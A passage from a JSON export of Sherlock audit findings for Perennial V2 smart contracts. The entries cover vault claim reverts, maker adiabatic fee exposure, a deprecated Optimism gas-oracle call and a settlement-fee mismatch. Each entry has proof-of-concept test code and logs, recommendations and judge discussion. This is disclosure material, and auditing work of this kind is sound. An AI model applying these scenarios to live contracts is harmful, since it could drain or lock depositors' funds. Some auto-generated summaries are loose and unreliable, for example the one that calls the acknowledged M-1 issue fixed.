.unsafeSub(withdrawal)\n        .unsafeSub(context.global.assets)\n        .unsafeSub(context.global.deposit);\n\n    return redemptionEligable\n        // approximate assets up for redemption\n        .mul(context.global.redemption.unsafeDiv(context.global.shares.add(context.global.redemption)))\n        // assets pending claim\n        .add(context.global.assets)\n        // assets withdrawing\n        .add(withdrawal);\n}\n```\n\nNotice that `ineligable` adds `withdrawal` in the end (which is the assets claimed by the user). Now back to collateral and assets calculation:\n- `collateral = totalCollateral + deposit - withdrawal`\n- `assets = collateral - ineligable = collateral - (redemptionEligable * redemption / (redemption + shares) + global.assets + withdrawal)`\n- `assets = totalCollateral + deposit - withdrawal - [redemptionIneligable] - global.assets - withdrawal`\n- `assets = totalCollateral + deposit - [redemptionIneligable] - global.assets - 2 * withdrawal`\n\nSee that `withdrawal` (assets claimed by the user) is subtracted twice in assets calculations. This means that assets calculated are smaller than it should. In particular, assets might become less than minAssets thus reverting in the following line:\n```solidity\n  if (assets.lt(strategy.minAssets)) revert StrategyLibInsufficientAssetsError();\n```\n\nPossible scenario for this issue to cause inability to claim funds:\n1. Some vault market's has a high skew (|long - short|), which means that minimum maker position is limited by the skew.\n2. User redeems large amount from the vault, reducing vault's position in that market so that market maker ~= |long - short|. This means that further redeems from the vault are not possible because the vault can't reduce its position in the market.\n3. After that, the user tries to claim what he has redeemed, but all attempts to redeem will revert (both for this user and for any other user that might want to claim)\n\n## Impact\n\nIn certain situations (redeem not possible from the vault due to high skew in some underlying market) claiming assets from the vault will revert for all users, temporarily (and sometimes permanently) locking user funds in the contract.\n\n## Proof of concept\n\nThe scenario above is demonstrated in the test, change the following test in test/integration/vault/Vault.test.ts:\n```ts\n    it('simple deposits and redemptions', async () => {\n...\n      // Now we should have opened positions.\n      // The positions should be equal to (smallDeposit + largeDeposit) * leverage originalOraclePrice.\n      expect(await position()).to.equal(\n        smallDeposit.add(largeDeposit).mul(leverage).mul(4).div(5).div(originalOraclePrice),\n      )\n      expect(await btcPosition()).to.equal(\n        smallDeposit.add(largeDeposit).mul(leverage).div(5).div(btcOriginalOraclePrice),\n      )\n\n      /*** remove all lines after this and replace with the following code: ***/\n\n      var half = smallDeposit.add(largeDeposit).div(2).add(smallDeposit);\n      await vault.connect(user).update(user.address, 0, half, 0)\n\n      await updateOracle()\n      await vault.connect(user2).update(user2.address, smallDeposit, 0, 0) // this will create min position in the market\n      await vault.connect(user).update(user.address, 0, 0, half) // this will revert even though it's just claiming\n    })\n```\n\nThe last line in the test will revert, even though it's just claiming assets. If the pre-last line is commented out (no \"min position\" created in the market), it will work normally.\n\n## Code Snippet\n\nIneligable amount calculation adds `withdrawal`:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial-vault/contracts/Vault.sol#L431\n\n`withdrawal` is subtracted twice - once directly from collateral, 2nd time via ineligable amount subtractions:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial-vault/contracts/lib/StrategyLib.sol#L118-L119\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRemove `add(withdrawal)` from `_ineligable` calculation in the vault.\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/equilibria-xyz/perennial-v2/pull/303",
      "summary": "\nThe report discusses a bug in the Perennial v2 protocol where transactions to claim assets from the vault may revert in certain situations. This is due to a double subtraction of the claimed assets in market position allocations calculation. The bug was found by a user named panprog and it affects all users trying to claim assets that have already been redeemed and settled. \n\nThe vulnerability occurs when the vault rebalances its collateral after assets are claimed. In the rebalance calculations, the assets are subtracted twice, leading to a smaller calculated amount. This can cause the assets to be less than the minimum required amount, resulting in a revert. This issue can also lock user funds in the contract temporarily or even permanently in some cases.\n\nThe report includes a proof of concept where the bug is demonstrated in a test. It also provides a code snippet showing where the issue occurs in the code. The tool used for this report was manual review. The recommendation is to remove the `add(withdrawal)` from the `_ineligable` calculation in the vault. \n\nThe protocol team has already fixed this issue in the Perennial v2 code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/11",
      "tags": [],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "31175",
      "title": "M-3: Orders on Optimism chains can not be settled due to revert of ````keep()````",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/10 \n\n## Found by \nKingNFT\n## Summary\nAfter ````Ecotone```` upgrade, Optimism's ````OptGasInfo(\"0x420000000000000000000000000000000000000F\").scalar()```` function has been deprecated, which would cause ````Kept_Optimism```` contract  ````revert```` always.\n\nReference: https://docs.optimism.io/stack/transactions/fees#l1-data-fee\n\n## Vulnerability Detail\nThe issue arises on L29 of ````_calldataFee()```` function, as ```` OPT_GAS.scalar()```` would revert.\n\n```solidity\nFile: contracts\\attribute\\Kept\\Kept_Optimism.sol\n14: abstract contract Kept_Optimism is Kept {\n...\n16:     OptGasInfo constant OPT_GAS = OptGasInfo(0x420000000000000000000000000000000000000F);\n\n20:     function _calldataFee(\n...\n24:     ) internal view virtual override returns (UFixed18) {\n25:         return _fee(\n26:             OPT_GAS.getL1GasUsed(applicableCalldata),\n27:             multiplierCalldata,\n28:             bufferCalldata,\n29:             OPT_GAS.l1BaseFee() * OPT_GAS.scalar() / (10 ** OPT_GAS.decimals()) // @audit revert due to OPT_GAS.scalar()\n30:         );\n31:     }\n32: }\n\n```\n\nThe following PoC is built on both Optimism  and Base mainnet, we can see ```` OPT_GAS.scalar()```` reverts with ````GasPriceOracle: scalar() is deprecated```` message.\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\n\ninterface OptGasInfo {\n    function scalar() external view returns (uint256);\n}\n\ncontract OptimismKeepFeeBug is Test {\n    uint256 constant BLOCK_HEIGHT = 12520000;//118120000; // Mar-30-2024 10:46:17 PM +UTC\n    string constant RPC_URL = \"https://mainnet.base.org\";//\"https://mainnet.optimism.io\";\n    OptGasInfo constant OPT_GAS = OptGasInfo(0x420000000000000000000000000000000000000F);\n\n    function setUp() public {\n        vm.createSelectFork(RPC_URL, BLOCK_HEIGHT);\n    }\n\n    function testOptGasInfoScalarCallRevert() public {\n        vm.expectRevert();\n        OPT_GAS.scalar();\n    }\n}\n```\n\nthe test log:\n```solidity\n2024-02-perennial-v2-3\\root> forge test --mc OptimismKeepFeeBug -vvvv\n[⠒] Compiling...\n[⠊] Compiling 1 files with 0.8.23Compiler run successful!\n[⠒] Compiling 1 files with 0.8.23\n[⠢] Solc 0.8.23 finished in 2.48s\n\nRunning 1 test for test/OptimismKeepFeeBug.t.sol:OptimismKeepFeeBug\n[PASS] testOptGasInfoScalarCallRevert() (gas: 13337)\nTraces:\n  [13337] OptimismKeepFeeBug::testOptGasInfoScalarCallRevert()\n    ├─ [0] VM::expectRevert(custom error f4844814:)\n    │   └─ ← ()\n    ├─ [7434] 0x420000000000000000000000000000000000000F::scalar() [staticcall]\n    │   ├─ [2436] 0xb528D11cC114E026F138fE568744c6D45ce6Da7A::scalar() [delegatecall]\n    │   │   └─ ← revert: GasPriceOracle: scalar() is deprecated\n    │   └─ ← revert: GasPriceOracle: scalar() is deprecated\n    └─ ← ()\n\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 842.07ms\n\nRan 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n## Impact\nOrders can not be settled, break of core functionality.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/root/contracts/attribute/Kept/Kept_Optimism.sol#L29\n\n## Tool used\n\nManual Review\n\n## Recommendation\nreference: https://docs.optimism.io/stack/transactions/fees#ecotone\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/equilibria-xyz/root/pull/90",
      "summary": "\nThe report discusses a bug found on the Optimism blockchain that prevents orders from being settled. This is due to a deprecated function in the Ecotone upgrade that causes the Kept_Optimism contract to always revert. The issue is caused by a line of code in the _calldataFee() function, which references the deprecated function. This bug affects the core functionality of the blockchain and has been fixed by the protocol team.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/10",
      "tags": [],
      "finders": [
        "KingNFT"
      ]
    },
    {
      "id": "31174",
      "title": "M-2: Makers can lose funds from price movement even when no long and short positions are opened, due to incorrect distribution of adiabatic fees exposure between makers",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/9 \n\n## Found by \npanprog\n## Summary\n\nAdiabatic fees introduced in this new update of the protocol (v2.3) were introduced to solve the problem of adiabatic fees netting out to 0 in market token's rather than in USD terms. With the new versions, this problem is solved and adiabatic fees now net out to 0 in USD terms. However, they net out to 0 only for the whole makers pool, but each individual maker can have profit or loss from adiabatic fees at different price levels all else being equal. This creates unexpected risk of loss of funds from adiabatic fees for individual makers, which can be significant, up to several percents of the amount invested.\n\n## Vulnerability Detail\n\nThe issue is demonstrated in the following scenario:\n- price = 1\n- Alice open `maker = 10` (`collateral = +0.9` from adiabatic fee)\n- Bob opens `maker = 10` (`collateral = +0.7` from adiabatic fee)\n- Path A. `price = 1`. Bob closes (final collateral = +0), Alice closes (final collaterral = +0)\n- Path B. `price = 2`. Bob closes (final collateral = +0.1), Alice closes (final collaterral = -0.1)\n- Path C. `price = 0.5`. Bob closes (final collateral = -0.05), Alice closes (final collateral = +0.05)\n\nNotice that both Alice and Bob are the only makers, there are 0 longs and 0 shorts, but still both Alice and Bob pnl depends on the market price due to pnl from adiabatic fees. Adiabatic fees net out to 0 for all makers aggregated (Alice + Bob), but not for individual makers. Individual makers pnl from adiabatic fees is more or less random depending on the other makers who have opened.\n\nIf Alice were the only maker, then:\n- price = 1\n- Alice opens `maker = 10` (`collateral = +0.9`)\n- price = 2: exposure adjusted +0.9 (Alice `collateral = +1.8`)\n- Alice closes `maker = 10` (adiabatic fees = `-1.8`, Alice final collateral = 0)\n\nFor the lone maker there is no such problem, final collateral is 0 regardless of price. The core of the issue lies in the fact that the maker's adiabatic fees exposure adjustment is weighted by makers open maker amount. So in the first example:\n- price = 1. Alice `maker = 10, exposure = +0.9`, Bob `maker = 10, exposure = +0.7`\n- price = 2. Total exposure is adjusted by +1.6, split evenly between Alice and Bob (+0.8 for each)\n- Alice new exposure = 0.9 + 0.8 = +1.7 (but adiabatic fees paid to close = -1.8)\n- Bob new exposure = 0.7 + 0.8 = +1.5 (but adiabatic fees paid to close = -1.4)\n\nIf maker exposure adjustment was weighted by individual makers exposure, then all is correct:\n- price = 1. Alice `maker = 10, exposure = +0.9`, Bob `maker = 10, exposure = +0.7`\n- price = 2. Total exposure is adjusted by +1.6, split 0.9:0.7 between Alice and Bob, e.g. +0.9 for Alice, +0.7 for Bob\n- Alice new exposure = 0.9 + 0.9 = +1.8 (adiabatic fees paid to close = -1.8, net out to 0)\n- Bob new exposure = 0.7 + 0.7 = +1.4 (adiabatic fees paid to close = -1.4, net out to 0)\n\nIn the worst case, in the example above, if Bob opens `maker = 40` (adiabatic fees `scale = 50`), then at `price = 2`, Alice's final collateral is `-0.4` due to adiabatic fees. Given that Alice's position is 10 at `price = 2` (`notional = 20`), a loss of `-0.4` is a loss of `-2%` at 1x leverage, which is quite significant.\n\n## Impact\n\nIndividual makers bear an additional undocumented price risk due to adiabatic fees, which is quite significant (can be several percentages of the notional).\n\n## Proof of concept\n\nThe scenario above is demonstrated in the test, change the following test in test/unit/market/Market.test.ts:\n```ts\nit('adiabatic fee', async () => {\n  function setupOracle(price: string, timestamp : number, nextTimestamp : number) {\n    const oracleVersion = {\n      price: parse6decimal(price),\n      timestamp: timestamp,\n      valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n    oracle.status.returns([oracleVersion, nextTimestamp])\n    oracle.request.returns()\n  }\n\n  async function showInfo() {\n    await market.settle(user.address);\n    await market.settle(userB.address);\n    await market.settle(userC.address);\n    var sum : BigNumber = BigNumber.from('0');\n    var info = await market.locals(user.address);\n    console.log(\"user collateral = \" + info.collateral);\n    sum = sum.add(info.collateral);\n    var info = await market.locals(userB.address);\n    sum = sum.add(info.collateral);\n    console.log(\"userB collateral = \" + info.collateral);\n    var info = await market.locals(userC.address);\n    sum = sum.add(info.collateral);\n  }\n\n  async function showVer(ver : number) {\n    var v = await market.versions(ver);\n    console.log(\"ver\" + ver + \": makerValue=\" + v.makerValue + \" longValue=\" + v.longValue + \n    \" makerPosFee=\" + v.makerPosFee + \" makerNegFee=\" + v.makerNegFee +\n    \" takerPosFee=\" + v.takerPosFee + \" takerNegFee=\" + v.takerNegFee\n    );\n  }\n\n  const riskParameter = { ...(await market.riskParameter()) }\n  const riskParameterMakerFee = { ...riskParameter.makerFee }\n  riskParameterMakerFee.linearFee = parse6decimal('0.00')\n  riskParameterMakerFee.proportionalFee = parse6decimal('0.00')\n  riskParameterMakerFee.adiabaticFee = parse6decimal('0.01')\n  riskParameterMakerFee.scale = parse6decimal('50.0')\n  riskParameter.makerFee = riskParameterMakerFee\n  const riskParameterTakerFee = { ...riskParameter.takerFee }\n  riskParameterTakerFee.linearFee = parse6decimal('0.00')\n  riskParameterTakerFee.proportionalFee = parse6decimal('0.00')\n  riskParameterTakerFee.adiabaticFee = parse6decimal('0.01')\n  riskParameterTakerFee.scale = parse6decimal('50.0')\n  riskParameter.takerFee = riskParameterTakerFee\n  await market.connect(owner).updateRiskParameter(riskParameter)\n\n  marketParameter = {\n    fundingFee: parse6decimal('0.0'),\n    interestFee: parse6decimal('0.0'),\n    oracleFee: parse6decimal('0.0'),\n    riskFee: parse6decimal('0.0'),\n    positionFee: parse6decimal('0.0'),\n    maxPendingGlobal: 5,\n    maxPendingLocal: 3,\n    settlementFee: 0,\n    makerCloseAlways: false,\n    takerCloseAlways: false,\n    closed: false,\n    settle: false,\n  }\n  await market.connect(owner).updateParameter(beneficiary.address, coordinator.address, marketParameter)\n\n  var time = TIMESTAMP;\n\n  setupOracle('1', time, time + 100);\n  await market.connect(user)\n      ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, POSITION, 0, 0, COLLATERAL, false);\n  await showInfo()\n  await showVer(time)\n\n  time += 100;\n  setupOracle('1', time, time + 100);\n  await market.connect(userB)\n      ['update(address,uint256,uint256,uint256,int256,bool)'](userB.address, POSITION, 0, 0, COLLATERAL, false);\n  await showInfo()\n  await showVer(time)\n\n  time += 100;\n  setupOracle('1', time, time + 100);\n  await showInfo()\n  await showVer(time)\n\n  time += 100;\n  setupOracle('2', time, time + 100);\n  await market.connect(userB)\n      ['update(address,uint256,uint256,uint256,int256,bool)'](userB.address, 0, 0, 0, 0, false);\n  await showInfo()\n  await showVer(time)\n\n  time += 100;\n  setupOracle('2', time, time + 100);\n  await market.connect(user)\n      ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, 0, 0, 0, 0, false);\n  await showInfo()\n  await showVer(time)\n\n  time += 100;\n  setupOracle('0.5', time, time + 100);\n  await showInfo()\n  await showVer(time)\n})\n```\n\nConsole log:\n```solidity\nuser collateral = 10000000000\nuserB collateral = 0\nver1636401093: makerValue=0 longValue=0 makerPosFee=0 makerNegFee=0 takerPosFee=0 takerNegFee=0\nuser collateral = 10000090000\nuserB collateral = 10000000000\nver1636401193: makerValue=0 longValue=0 makerPosFee=9000 makerNegFee=0 takerPosFee=0 takerNegFee=0\nuser collateral = 10000090000\nuserB collateral = 10000070000\nver1636401293: makerValue=0 longValue=0 makerPosFee=7000 makerNegFee=0 takerPosFee=0 takerNegFee=0\nuser collateral = 10000170000\nuserB collateral = 10000150000\nver1636401393: makerValue=8000 longValue=0 makerPosFee=0 makerNegFee=0 takerPosFee=0 takerNegFee=0\nuser collateral = 10000170000\nuserB collateral = 10000010000\nver1636401493: makerValue=8000 longValue=0 makerPosFee=0 makerNegFee=-14000 takerPosFee=0 takerNegFee=0\nuser collateral = 9999990000\nuserB collateral = 10000010000\nver1636401593: makerValue=-5500 longValue=0 makerPosFee=0 makerNegFee=-4500 takerPosFee=0 takerNegFee=0\n```\n\nNotice, that final user balance is -0.1 and final userB balance is +0.1\n\n## Code Snippet\n\nMaker exposure is applied to `makerValue`, meaning it's weighted by maker position size:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial/contracts/libs/VersionLib.sol#L314\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nSplit the total maker exposure by individual maker's exposure rather than by their position size. To do this:\n- Add another accumulator to track total exposure\n- Add individual maker `exposure` to user's `Local` storage\n- When accumulating local storage in the checkpoint, account global accumulator exposure weighted by individual user's exposure.\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/equilibria-xyz/perennial-v2/pull/300",
      "summary": "\nThe issue reported is related to adiabatic fees in the new update of the protocol (v2.3). These fees were introduced to solve a problem where fees would net out to 0 in market tokens instead of USD terms. However, the issue is that while the fees net out to 0 for the overall pool of makers, individual makers can still experience losses due to the distribution of these fees between makers. This can result in significant losses for individual makers, up to several percent of their invested amount.\n\nThe problem arises when multiple makers are involved, and the exposure adjustment for adiabatic fees is weighted by the maker's position size. This means that even if there are no long or short positions open, the maker's profit or loss from adiabatic fees depends on the market price. In contrast, if there is only one maker, the issue does not occur.\n\nThe impact of this issue is that individual makers are exposed to additional price risk, which can result in significant losses. This issue was identified through manual review, and the protocol team has fixed it in their latest update.\n\nThe recommendation is to split the total maker exposure by individual maker's exposure rather than their position size. This can be done by adding another accumulator to track total exposure and updating the code to account for individual maker's exposure when accumulating local storage.\n\nOverall, this bug report highlights the importance of thorough testing and review of code to identify and fix any potential issues that could result in losses for users. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/9",
      "tags": [],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "31173",
      "title": "M-1: When vault's market weight is set to 0 to remove the market from the vault, vault's leverage in this market is immediately set to max leverage risking position liquidation",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/8 \n\nThe protocol has acknowledged this issue.\n\n## Found by \npanprog\n## Summary\n\nIf any market has to be removed from the vault, the only way to do this is via setting this market's weight to 0. The problem is that the first vault rebalance will immediately withdraw max possible collateral from this market, leaving vault's leverage at max possible leverage, risking the vault's position liquidation. This is especially dangerous if vault's position in this removed market can not be closed due to high skew, so min position is not 0, but the leverage will be at max possible value. As a result, vault depositors can lose funds due to liquidation of vault's position in this market.\n\n## Vulnerability Detail\n\nWhen vault is rebalanced, each market's collateral is calculated as following:\n```solidity\n    marketCollateral = marketContext.margin\n        .add(collateral.sub(totalMargin).mul(marketContext.registration.weight));\n\n    UFixed6 marketAssets = assets\n        .mul(marketContext.registration.weight)\n        .min(marketCollateral.mul(LEVERAGE_BUFFER));\n```\n\nFor removed markets (`weight = 0`), `marketCollateral` will be set to `marketContext.margin` (i.e. minimum valid collateral to have position at max leverage), `marketAssets` will be set to 0. But later the position will be adjusted in case minPosition is not 0:\n```solidity\n    target.position = marketAssets\n        .muldiv(marketContext.registration.leverage, marketContext.latestPrice.abs())\n        .max(marketContext.minPosition)\n        .min(marketContext.maxPosition);\n```\n\nThis means that vault's position in the market with weight 0 will be at max leverage until liquidated or position can be closed.\n\n## Impact\n\nMarket removed from the vault (weight set to 0) is put at max leverage and has a high risk of being liquidated, thus losing vault depositors funds.\n\n## Proof of concept\n\nThe scenario above is demonstrated in the test, change the following test in test/integration/vault/Vault.test.ts:\n```ts\n    it('simple deposits and redemptions', async () => {\n...\n      // Now we should have opened positions.\n      // The positions should be equal to (smallDeposit + largeDeposit) * leverage originalOraclePrice.\n      expect(await position()).to.equal(\n        smallDeposit.add(largeDeposit).mul(leverage).mul(4).div(5).div(originalOraclePrice),\n      )\n      expect(await btcPosition()).to.equal(\n        smallDeposit.add(largeDeposit).mul(leverage).div(5).div(btcOriginalOraclePrice),\n      )\n\n      /*** remove all lines after this and replace with the following code: ***/\n\n      console.log(\"pos1 = \" + (await position()) + \" pos2 = \" + (await btcPosition()) + \" col1 = \" + (await collateralInVault()) + \" col2 = \" + (await btcCollateralInVault()));\n\n      // update weight\n      await vault.connect(owner).updateWeights([parse6decimal('1.0'), parse6decimal('0')])\n\n      // do small withdrawal to trigger rebalance\n      await vault.connect(user).update(user.address, 0, smallDeposit, 0)\n      await updateOracle()\n\n      console.log(\"pos1 = \" + (await position()) + \" pos2 = \" + (await btcPosition()) + \" col1 = \" + (await collateralInVault()) + \" col2 = \" + (await btcCollateralInVault()));\n    })\n```\n\nConsole log:\n```solidity\npos1 = 12224846 pos2 = 206187 col1 = 8008000000 col2 = 2002000000\npos1 = 12224846 pos2 = 206187 col1 = 9209203452 col2 = 800796548\n```\n\nNotice, that after rebalance, position in the removed market (pos2) is still the same, but the collateral (col2) reduced to minimum allowed.\n\n## Code Snippet\n\nVault market allocation sets collateral to only the margin if `weight = 0`:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial-vault/contracts/lib/StrategyLib.sol#L152-L153\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nEnsure that the market's collateral is based on leverage even if `weight = 0`\n\n\n\n## Discussion\n\n**arjun-io**\n\nWe would likely consider this a low for two reason:\n1. The admin has control over when the vault is set to 0 weight, so as long as the limits don't prevent the vault from fully closing the position this is a safe operation to perform\n2. The liquidation fee would be an acceptable cost in the cases when the above doesn't apply (i.e. in an emergency)\n\n**nevillehuang**\n\n@panprog Do you agree with the above explanation by sponsor?\n\n**panprog**\n\n@nevillehuang @arjun-io \nThe issue is that it's not just a liquidation, it's that the vault will be bricked most of the time while that market's collateral is below margin and above maintenance (due to #23), i.e.:\n1. Market's min margin for position is $10. When the weight is 0, market collateral will be set to $10 exactly\n2. The following version's price is slightly against the maker, so market's collateral is now $9.999\n3. Any vault action will first try to settle (by calling market.update) and since it's below margin, it will revert.\n\nSo until the position is liquidated or back above margin - the vault is bricked. It happens both due to this issue and to #23, so this issue is different from #23, but their combination causes this impact.\n\nIf the position is back above margin, next vault action will put it back at exactly margin, so the probability of vault bricking is very high and it can be for extended time.\n\nSo for all these considerations I still think it's medium.\n\n**arjun-io**\n\nI see, the confluence with #23 does cause some further issues. Due to the admin's ability to control this weighting I think it's less of an issue but I will defer to the judge\n\n**panprog**\n\nI believe that sherlock's rules towards admin issues is that if admin does some valid action, but the consequences are unexpected and cause some bad impact (loss of funds / breaking core functionality), then the issue is valid. Here the admin sets weight to 0 in expectation that the market is removed from the vault. Ok, maybe he's aware that collateral will be at min margin and OK with the liquidation fee in such case. But I highly doubt that in such case admin is aware that the vault will be bricked temporarily (which is breaking the core functionality). Note, that in such case admin can not do anything to resume vault operation, because setting weight back to non-0 will revert since it tries to rebalance at the start of this function. That's why I think it's valid medium.\n\n**arjun-io**\n\nIn that case, I agree a medium is appropriate",
      "summary": "\nThe bug report discusses an issue with the protocol where if a market is removed from the vault by setting its weight to 0, the vault's leverage in that market is automatically set to the maximum, putting it at risk of liquidation. This is especially dangerous if the position in the removed market cannot be closed due to high skew. This can result in the loss of funds for the vault's depositors. The report includes a vulnerability detail, impact, proof of concept, code snippet, and discussion among the team. The team has acknowledged the issue and has deemed it a medium priority. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/8",
      "tags": [],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "31172",
      "title": "H-3: Vault global shares and assets change will mismatch local shares and assets change during settlement due to incorrect `_withoutSettlementFeeGlobal` formula",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/26 \n\n## Found by \npanprog\n## Summary\n\nEvery vault update, which involves change of position in the underlying markets, `settlementFee` is charged by the Market. Since many users can deposit and redeem during the same oracle version, this `settlementFee` is shared equally between all users of the same oracle version. However, there is an issue in that `settlementFee` is charged once both for deposits and redeems, however `_withoutSettlementFeeGlobal` subtracts `settlementFee` in full both for deposits and redeems, meaning that for global fee, it's basically subtracted twice (once for deposits, and another time for redeems). But for local fee, it's subtracted proportional to `checkpoint.orders`, with sum of fee subtracted equal to exactly `settlementFee` (once). This difference in global and local `settlementFee` calculations leads to inflated `shares` and `assets` added for user deposits (local state) compared to vault overall (global state).\n\n## Vulnerability Detail\n\nHere is an easy scenario to demonstrate the issue:\n1. `SettlementFee = $10`\n2. User1 deposits `$10` for oracle version `t = 100`\n3. User2 redeems `10 shares` (worth `$10`) for the same oracle version `t = 100` (`checkpoint.orders = 2`)\n4. Once the oracle version `t = 100` settles, we have the following:\n4.1. Global deposits = $10, redeems = $10\n4.2. Global deposits convert to `0 shares` (because `_withoutSettlementFeeGlobal(10)` applies `settlementFee` of $10 in full, returning `10-10=0`)\n4.3. Global redeems convert to `0 assets` (because `_withoutSettlementFeeGlobal(10)` applies `settlementFee` of $10 in full, returning `10-10=0`)\n4.4. User1 deposit of $10 converts to `5 shares` (because `_withoutSettlementFeeLocal(10)` applies `settlementFee` of $5 (because there are 2 orders), returning `10-5=5`)\n4.5. User2 redeem of 10 shares converts to `$5` (for the same reason)\n\nFrom the example above it can be seen that:\n1. User1 receives 5 shares, but global vault shares didn't increase. Over time this difference will keep growing potentially leading to a situation where many user redeems will lead to 0 global shares, but many users will still have local shares which they will be unable to redeem due to underflow, thus losing funds.\n2. User2's assets which he can claim increase by $5, but global claimable assets didn't change, meaning User2 will be unable to claim assets due to underflow when trying to decrease global assets, leading to loss of funds for User2.\n\nThe underflow in both cases will happen in `Vault._update` when trying to update global account:\n```solidity\nfunction update(\n    Account memory self,\n    uint256 currentId,\n    UFixed6 assets,\n    UFixed6 shares,\n    UFixed6 deposit,\n    UFixed6 redemption\n) internal pure {\n    self.current = currentId;\n    // @audit global account will have less assets and shares than sum of local accounts\n    (self.assets, self.shares) = (self.assets.sub(assets), self.shares.sub(shares));\n    (self.deposit, self.redemption) = (self.deposit.add(deposit), self.redemption.add(redemption));\n}\n```\n\n## Impact\n\nAny time there are both deposits and redeems in the same oracle version, the users receive more (local) shares and assets than overall vault shares and assets increase (global). This mismatch causes:\n1. Systematic increase of (sum of user shares - global shares), which can lead to bank run since the last users who try to redeem will be unable to do so due to underflow.\n2. Systematic increase of (sum of user assets - global assets), which will lead to users being unable to claim their redeemed assets due to underflow.\n\nThe total difference in local and global `shares+assets` equals to `settlementFee` per each oracle version with both deposits and redeems. This can add up to significant amounts (at `settlementFee = $1` this can be $100-$1000 per day), meaning it will quickly become visible especially for point 2., because typically global claimable assets are at or near 0 most of the time, since users usually redeem and then immediately claim, thus any difference of global and local assets will quickly lead to users being unable to claim.\n\n## Code Snippet\n\nSettlementFee subtracted in `_withoutSettlementFeeGlobal`\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial-vault/contracts/types/Checkpoint.sol#L183-L185\n\nThis is subtracted twice: for deposit and for redeem:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial-vault/contracts/types/Account.sol#L62-L63\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCalculate total orders to deposit and total orders to redeem (in addition to total orders overall). Then `settlementFee` should be multiplied by `deposit/orders` for `toGlobalShares` and by `redeems/orders` for `toGlobalAssets`. This weightening of `settlementFee` will make it in-line with local order weights.\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/equilibria-xyz/perennial-v2/pull/305",
      "summary": "\nThe bug report discusses an issue where the calculation of settlement fees for deposits and redeems in a vault is causing a mismatch between the global shares and assets and the local shares and assets. This can lead to a systematic increase in shares and assets for users, making it difficult for them to redeem their funds due to underflow. The report suggests a solution to calculate the total orders for deposits and redeems and weight the settlement fees accordingly. The issue has been fixed by the protocol team in a recent PR.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/26",
      "tags": [],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "31171",
      "title": "H-2: Requested oracle versions, which have expired, must return this oracle version as invalid, but they return it as a normal version with previous version's price instead",
      "impact": "HIGH",
